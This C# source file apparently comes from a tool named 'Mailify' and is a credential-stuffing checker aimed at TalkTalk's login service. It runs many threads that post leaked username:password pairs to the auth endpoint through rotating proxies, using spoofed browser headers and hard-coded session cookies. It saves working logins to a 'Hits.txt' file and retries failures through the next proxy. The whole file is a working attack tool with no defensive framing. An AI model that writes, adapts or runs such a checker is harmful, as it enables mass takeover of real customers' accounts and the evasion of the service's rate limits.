using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class TalkTalk
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    req.AddHeader("cookie", "_csrf=wboyEYZYWb5RdpWccteil4TD; optimizelyEndUserId=oeu1617064857362r0.7955122004083077; _gcl_au=1.1.28746983.1617064862; _uetsid=9b098de090f011eb8fc22fcc0b42f721; _uetvid=9b09c0a090f011ebaac56b9ce9b91938; _ga=GA1.3.1036395690.1617064864; _gid=GA1.3.679753613.1617064864; _gat_UA-26765492-2=1; _gat_UA-26765492-24=1; __adal_ses=*; __adal_ca=so%3DGoogle%26me%3Dorganic%26ca%3D%28not%2520set%29%26co%3D%28not%2520set%29%26ke%3D%28not%2520set%29; __adal_cw=1617064864958; __adal_id=b17cf94f-9c36-4e3d-8d8c-31ed8557367f.1617064865.2.1617064865.1617064865.e12647c9-62cf-4880-907f-71af3dddba0f; tiscalicustomsettings=colscheme%3D%26fontsize%3D%26group%3Dh20%26hpswitched%3D%26hpvisits%3D%26hponnet%3D%26textonly%3D; portalId=tt-organic; TS01708346=018ed4097b72052a8f7bcedc495f8c4e1261ad278f18ad48fb7d523a8c88c7207aa942ecc42a7232e37dc694dd562ce1318c126e120d410ad827b2f23b9735844ac557d7de0091feea771d660929273fbf80623f8a; _fbp=fb.2.1617064865454.1785309920; __qca=P0-43869762-1617064865764; smc_uid=1617064870594449; smc_tag=eyJpZCI6MjU0NywibmFtZSI6InRhbGt0YWxrLmNvLnVrIn0=; smc_refresh=12861; LPVID=YzYTBlZTZlNzk0NDcwNTNh; LPSID-45956611=3r1UpoR2TGe3OV_QfGncIw; smc_spv=1; smc_tpv=1; smc_sesn=1; smc_not=default; ADRUM=s=1617064878125&r=https%3A%2F%2Fwww.talktalk.co.uk%2Fshop%2F%3F0; smct_session={\"s\":1617064873377,\"l\":1617064879381,\"lt\":1617064879382,\"t\":8,\"p\":8}; __cfduid=de2036f6d513e07b7e921ec37e62522821617064879; did=s%3Av0%3Aa4ba36b0-90f0-11eb-b68f-3b600c7c9911.izRuvYGEd%2FQ3dXKcOA6Nt7Ww4mrECI3fx9562neSGOo; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQL1RvkdYyRLCRmhjWbnJv2lcBKcfRJXchBUA2Ddpk5WALFiuo5jCJu_hy4e4sIWj65pIRLEjEBHG90Cx1gcjnMemY29va2llg6dleHBpcmVz1_9_ytgAYGZoL65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.OJnWdR2RfCtSfqGDJcxxcAu4i33B4H%2B9bL7YmJ026FY; did_compat=s%3Av0%3Aa4ba36b0-90f0-11eb-b68f-3b600c7c9911.izRuvYGEd%2FQ3dXKcOA6Nt7Ww4mrECI3fx9562neSGOo; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQL1RvkdYyRLCRmhjWbnJv2lcBKcfRJXchBUA2Ddpk5WALFiuo5jCJu_hy4e4sIWj65pIRLEjEBHG90Cx1gcjnMemY29va2llg6dleHBpcmVz1_9_ytgAYGZoL65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.OJnWdR2RfCtSfqGDJcxxcAu4i33B4H%2B9bL7YmJ026FY; _gat=1; ki_t=1617064881923%3B1617064881923%3B1617064881923%3B1%3B1; ki_r=aHR0cHM6Ly93d3cudGFsa3RhbGsuY28udWsv");
                    req.AddHeader("origin", "https://auth.talktalk.co.uk");
                    req.AddHeader("referer", "https://auth.talktalk.co.uk/login?state=g6Fo2SB4V3ZzMVl6Rkstd0VkWFdNaUthYnFuRmRheXhfRVFHdKN0aWTZIDdnNlc1dnJ3UHNLUVU2ZHk4RW1kdm8zR3RiZXpvWjk4o2NpZNkgYjdWc05JMWRJUzFkN3VJRFZZekc5VjZ3WUhZaHlJRUk&client=b7VsNI1dIS1d7uIDVYzG9V6wYHYhyIEI&protocol=oauth2&response_mode=query&scope=openid%20email%20profile&err=&response_type=code&redirect_uri=https%3A%2F%2Fsso.talktalk.co.uk%2Fverify");
                    req.AddHeader("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not\\\"A\\\\Brand\";v=\"99\"");
                    req.AddHeader("sec-ch-ua-mobile", "?1");
                    req.AddHeader("sec-fetch-dest", "empty");
                    req.AddHeader("sec-fetch-mode", "cors");
                    req.AddHeader("sec-fetch-site", "same-origin");
                    req.AddHeader("user-agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36");

                    var res0 = req.Post("https://auth.talktalk.co.uk/usernamepassword/login", "{\"client_id\":\"b7VsNI1dIS1d7uIDVYzG9V6wYHYhyIEI\",\"redirect_uri\":\"https://sso.talktalk.co.uk/verify\",\"tenant\":\"talktalk\",\"response_type\":\"code\",\"scope\":\"openid email profile\",\"_csrf\":\"TK77uFLK-4hxU_cdobE0cgvCGVoDIVKav3mI\",\"state\":\"g6Fo2SB4V3ZzMVl6Rkstd0VkWFdNaUthYnFuRmRheXhfRVFHdKN0aWTZIDdnNlc1dnJ3UHNLUVU2ZHk4RW1kdm8zR3RiZXpvWjk4o2NpZNkgYjdWc05JMWRJUzFkN3VJRFZZekc5VjZ3WUhZaHlJRUk\",\"_intstate\":\"deprecated\",\"username\":\"" + credentials[0] + "\",\"password\":\"" + credentials[1] + "\",\"connection\":\"Username-Password-Authentication\"}", "application/json");
                    string text0 = res0.ToString();

                    if (text0.Contains("https://auth.talktalk.co.uk/login/callback"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text0.Contains("{\"name\":\"ValidationError\",\"code\":\"invalid_user_password\",\"description\":\"Wrong email or password.\",\"statusCode\":400,\"fromSandbox\":true}") || text0.Contains("invalid_user_password") || text0.Contains("Wrong email or password."))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}